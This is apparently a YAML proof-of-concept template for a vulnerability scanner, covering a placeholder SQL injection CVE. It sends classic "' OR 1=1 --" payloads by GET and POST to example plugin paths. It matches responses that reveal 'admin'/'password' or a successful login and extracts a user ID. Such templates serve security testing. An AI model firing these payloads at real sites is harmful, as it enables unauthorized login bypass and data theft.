name: poc-yaml-cve-2023-example-payloads
transport: http
payloads:
  continue_: false
  payloads:
    path1:
      path: "wp-content/plugins/example/vulnerable.php"
      param: "id"
      payload: "1' OR 1=1 --"
    path2:
      path: "administrator/components/example/vulnerable.php"
      param: "user"
      payload: "admin' OR 1=1 --"
    path3:
      path: "includes/example/vulnerable.php"
      param: "name"
      payload: "test' OR 1=1 --"
rules:
  r0:
    request:
      method: GET
      path: "/{{path}}?{{param}}={{payload}}"
      follow_redirects: true
    expression: |
      response.status == 200 && response.body_string.contains("admin") && response.body_string.contains("password")
  r1:
    request:
      method: POST
      path: "/{{path}}"
      headers:
        Content-Type: application/x-www-form-urlencoded
      body: "{{param}}={{payload}}"
      follow_redirects: true
    expression: |
      response.status == 200 && response.body_string.contains("login successful")
    output:
      search: '"user_id\":\"(?P<userid>[^\"]+)".bsubmatch(response.body)'
      userid: search["userid"]
expression: r0() || r1()
detail:
  author: neutron-poc
  links:
    - https://example.com/cve-2023-example
  description: SQL 注入漏洞 POC 示例
  vulnerability:
    id: cve-2023-example
    level: high
    match: "用户 ID: {{userid}}" 